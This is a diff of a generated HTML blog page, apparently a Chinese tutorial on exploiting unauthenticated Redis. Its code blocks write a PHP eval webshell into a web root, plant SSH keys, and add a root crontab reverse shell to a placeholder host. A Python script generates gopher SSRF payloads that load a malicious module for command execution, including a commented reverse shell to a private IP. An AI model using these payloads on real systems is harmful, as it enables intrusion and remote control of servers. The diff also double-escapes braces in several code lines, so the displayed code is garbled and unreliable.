@@ -30,9 +30,9 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.1">
+<meta name="generator" content="Hexo 5.4.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+</head>
 
 
 
@@ -466,7 +466,7 @@ config set dir
 <h2 id="0x2-2-写webshell"><a href="#0x2-2-写webshell" class="headerlink" title="0x2.2 写webshell"></a>0x2.2 写webshell</h2><p>这种情况一般大都是出在了root权限执行的redis中,或者是以某个web服务来启动的redis，从而对web目录具有了可写的权限。</p>
 <p>这个操作网上的payload其实很多都有风险性,一些不懂redis的小白就很容易误操作。</p>
 <pre class=" language-java"><code class="language-java">flushall
-set <span class="token number">1</span> <span class="token string">'&lt;?php eval($_GET["cmd"]);?>'</span>
+set <span class="token number">1</span> <span class="token string">'&lt;?php eval($_GET["cmd"]);?&gt;'</span>
 config set dir <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html
 config set dbfilename shell<span class="token punctuation">.</span>php
 save
@@ -478,7 +478,7 @@ save
 <p><img src="https://img-blog.csdnimg.cn/c2ac676a3dd24b18aa6afe68b9acdeaf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>默认保存的是当前数据库下内容,所以我们完全不用flushall来清空默认0号的数据库内容</p>
 <p>我们只需这样子select 去切换其他的空数据库,然后就可以了。</p>
 <pre class=" language-java"><code class="language-java">select <span class="token number">5</span>
-set <span class="token number">1</span> <span class="token string">'&lt;?php eval($_POST["cmd"]);?>'</span>
+set <span class="token number">1</span> <span class="token string">'&lt;?php eval($_POST["cmd"]);?&gt;'</span>
 config set dir <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html
 config set dbfilename shell<span class="token punctuation">.</span>php
 save
@@ -498,7 +498,7 @@ save
 </code></pre>
 <p>这里要注意下数据库内容的决定是否要使用flushall</p>
 <p>这里为了保证写入的authorized_key能被解析,必须引入换行符(ubuntu亲测,要不然是不会成功)</p>
-<pre class=" language-java"><code class="language-java"><span class="token number">1</span><span class="token punctuation">.</span><span class="token punctuation">(</span>echo <span class="token operator">-</span>e <span class="token string">"\n\n"</span><span class="token punctuation">;</span> cat id_rsa<span class="token punctuation">.</span>pub<span class="token punctuation">;</span> echo <span class="token operator">-</span>e <span class="token string">"\n\n"</span><span class="token punctuation">)</span> <span class="token operator">></span> temp<span class="token punctuation">.</span>txt
+<pre class=" language-java"><code class="language-java"><span class="token number">1</span><span class="token punctuation">.</span><span class="token punctuation">(</span>echo <span class="token operator">-</span>e <span class="token string">"\n\n"</span><span class="token punctuation">;</span> cat id_rsa<span class="token punctuation">.</span>pub<span class="token punctuation">;</span> echo <span class="token operator">-</span>e <span class="token string">"\n\n"</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> temp<span class="token punctuation">.</span>txt
 <span class="token number">2</span><span class="token punctuation">.</span>cat temp<span class="token punctuation">.</span>txt <span class="token operator">|</span> redis<span class="token operator">-</span>cli <span class="token operator">-</span>p <span class="token number">6380</span>  <span class="token operator">-</span>x set <span class="token number">1</span>
 </code></pre>
 <p>然后按正常操作即可</p>
@@ -521,7 +521,7 @@ save
 <span class="token operator">/</span>var<span class="token operator">/</span>spool<span class="token operator">/</span>cron<span class="token operator">/</span>crontabs<span class="token operator">/</span>root，redis默认写入<span class="token number">644</span>非<span class="token number">600</span>，提示失败
 </code></pre>
 <p><strong>Centos下的利用</strong><br>实现命令:</p>
-<pre class=" language-java"><code class="language-java">set <span class="token number">1</span> <span class="token string">'\n\n*/1 * * * * bash -i >&amp; /dev/tcp/X.X.X.X/7789 0>&amp;1\n\n'</span>
+<pre class=" language-java"><code class="language-java">set <span class="token number">1</span> <span class="token string">'\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/X.X.X.X/7789 0&gt;&amp;1\n\n'</span>
 config set dir <span class="token operator">/</span>var<span class="token operator">/</span>spool<span class="token operator">/</span>cron<span class="token operator">/</span>
 config set dbfilename root
 save
@@ -532,7 +532,7 @@ save
 <p>这个我建议在尝试尝试完ssh之后,如果失败了，再结合判断是不是centos机器(实际概率比较大)</p>
 <p>再尝试这个。</p>
 <h2 id="0x2-5-写入高冗余数据"><a href="#0x2-5-写入高冗余数据" class="headerlink" title="0x2.5 写入高冗余数据"></a>0x2.5 写入高冗余数据</h2><p>当我们写入的内容是属于高冗余的数据时，redis默认会采用LZF压缩的方式来写入数据。</p>
-<pre class=" language-java"><code class="language-java">压缩：Redis默认采用LZF算法对生成的RDB文件做压缩处理，压缩后的文件远远小于内存大小，默认开启，可以通过参数config setrdbcompression<span class="token punctuation">{</span>yes<span class="token operator">|</span>no<span class="token punctuation">}</span>动态修改。
+<pre class=" language-java"><code class="language-java">压缩：Redis默认采用LZF算法对生成的RDB文件做压缩处理，压缩后的文件远远小于内存大小，默认开启，可以通过参数config setrdbcompression<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>yes<span class="token operator">|</span>no<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>动态修改。
 </code></pre>
 <p><img src="https://img-blog.csdnimg.cn/5fc5b4d47abb48f4b014d623a099b8a6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>这个时候我们就会出现一些奇怪的错误,</p>
 <p>debug起来相当麻烦</p>
@@ -684,7 +684,7 @@ okStr <span class="token operator">=</span> <span class="token string">""</span>
         cmd<span class="token operator">=</span><span class="token string">""</span>
         cmd<span class="token operator">+=</span><span class="token string">"*"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>xSplit<span class="token punctuation">)</span><span class="token punctuation">)</span>
         <span class="token keyword">for</span> i <span class="token keyword">in</span> xSplit<span class="token punctuation">:</span>
-            i <span class="token operator">=</span> i<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"${IFS}"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>
+            i <span class="token operator">=</span> i<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"$&amp;#123;IFS&amp;#125;"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>
             cmd<span class="token operator">+=</span><span class="token string">"\r\n"</span><span class="token operator">+</span><span class="token string">"$"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\r\n"</span><span class="token operator">+</span> i
         cmd<span class="token operator">+=</span><span class="token string">"\r\n"</span>
         <span class="token keyword">return</span> cmd
@@ -693,13 +693,13 @@ okStr <span class="token operator">=</span> <span class="token string">""</span>
     cmd<span class="token operator">=</span><span class="token punctuation">[</span>
      <span class="token string">"config set dir ./"</span><span class="token punctuation">,</span>
      <span class="token string">"config set dbfilename exp.so"</span><span class="token punctuation">,</span>
-     <span class="token string">"slaveof {i} {p}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token operator">=</span>ip<span class="token punctuation">,</span> p<span class="token operator">=</span>port<span class="token punctuation">)</span><span class="token punctuation">,</span>
+     <span class="token string">"slaveof &amp;#123;i&amp;#125; &amp;#123;p&amp;#125;"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token operator">=</span>ip<span class="token punctuation">,</span> p<span class="token operator">=</span>port<span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token string">"module load exp.so"</span><span class="token punctuation">,</span>
      <span class="token string">"system.exec ls"</span><span class="token punctuation">,</span>
-     <span class="token string">"system.exec rm${IFS}exp.so"</span><span class="token punctuation">,</span>
+     <span class="token string">"system.exec rm$&amp;#123;IFS&amp;#125;exp.so"</span><span class="token punctuation">,</span>
      <span class="token string">"quit"</span><span class="token punctuation">,</span>
      <span class="token punctuation">]</span>
-     <span class="token comment" spellcheck="true"># "system.exec bash${IFS}-i${IFS}>&amp;${IFS}/dev/tcp/192.168.8.103/4607${IFS}0>&amp;1",</span>
+     <span class="token comment" spellcheck="true"># "system.exec bash$&amp;#123;IFS&amp;#125;-i$&amp;#123;IFS&amp;#125;&gt;&amp;$&amp;#123;IFS&amp;#125;/dev/tcp/192.168.8.103/4607$&amp;#123;IFS&amp;#125;0&gt;&amp;1",</span>
     payload <span class="token operator">=</span> <span class="token string">""</span>
     <span class="token keyword">for</span> p <span class="token keyword">in</span> cmd<span class="token punctuation">:</span>
         payload <span class="token operator">+=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>tranToResp<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>
@@ -718,14 +718,14 @@ okStr <span class="token operator">=</span> <span class="token string">""</span>
     exitPayload <span class="token operator">=</span> <span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>tranToResp<span class="token punctuation">(</span><span class="token string">"slaveof no one"</span><span class="token punctuation">)</span> <span class="token operator">+</span> tranToResp<span class="token punctuation">(</span><span class="token string">"quit"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
     <span class="token keyword">if</span> authPass<span class="token punctuation">:</span>
         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"author attack:"</span><span class="token punctuation">)</span>
-        pd <span class="token operator">=</span> <span class="token string">"gopher://{host}:{port}/_%2a%32%0d%0a%24%34%0d%0a%61%75%74%68%0d%0a%24{l}%0d%0a{p}%0d%0a"</span>
+        pd <span class="token operator">=</span> <span class="token string">"gopher://&amp;#123;host&amp;#125;:&amp;#123;port&amp;#125;/_%2a%32%0d%0a%24%34%0d%0a%61%75%74%68%0d%0a%24&amp;#123;l&amp;#125;%0d%0a&amp;#123;p&amp;#125;%0d%0a"</span>
         pd <span class="token operator">=</span> pd<span class="token punctuation">.</span>format<span class="token punctuation">(</span>host<span class="token operator">=</span>ip<span class="token punctuation">,</span> port<span class="token operator">=</span>port<span class="token punctuation">,</span> l<span class="token operator">=</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>authPass<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token operator">=</span>authPass<span class="token punctuation">)</span>
         <span class="token keyword">print</span><span class="token punctuation">(</span>pd <span class="token operator">+</span> payload<span class="token punctuation">)</span>
         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"clean footprint:"</span><span class="token punctuation">)</span>
         <span class="token keyword">print</span><span class="token punctuation">(</span>pd <span class="token operator">+</span> exitPayload<span class="token punctuation">)</span>
     <span class="token keyword">else</span><span class="token punctuation">:</span>
         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"no author attack:"</span><span class="token punctuation">)</span>
-        pd <span class="token operator">=</span> <span class="token string">"gopher://{host}:{port}/_"</span>
+        pd <span class="token operator">=</span> <span class="token string">"gopher://&amp;#123;host&amp;#125;:&amp;#123;port&amp;#125;/_"</span>
         <span class="token keyword">print</span><span class="token punctuation">(</span>pd<span class="token punctuation">.</span>format<span class="token punctuation">(</span>host<span class="token operator">=</span>ip<span class="token punctuation">,</span> port<span class="token operator">=</span>port<span class="token punctuation">)</span><span class="token operator">+</span>payload<span class="token punctuation">)</span>
         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"clean footprint:"</span><span class="token punctuation">)</span>
         <span class="token keyword">print</span><span class="token punctuation">(</span>pd<span class="token punctuation">.</span>format<span class="token punctuation">(</span>host<span class="token operator">=</span>ip<span class="token punctuation">,</span> port<span class="token operator">=</span>port<span class="token punctuation">)</span> <span class="token operator">+</span> exitPayload<span class="token punctuation">)</span>
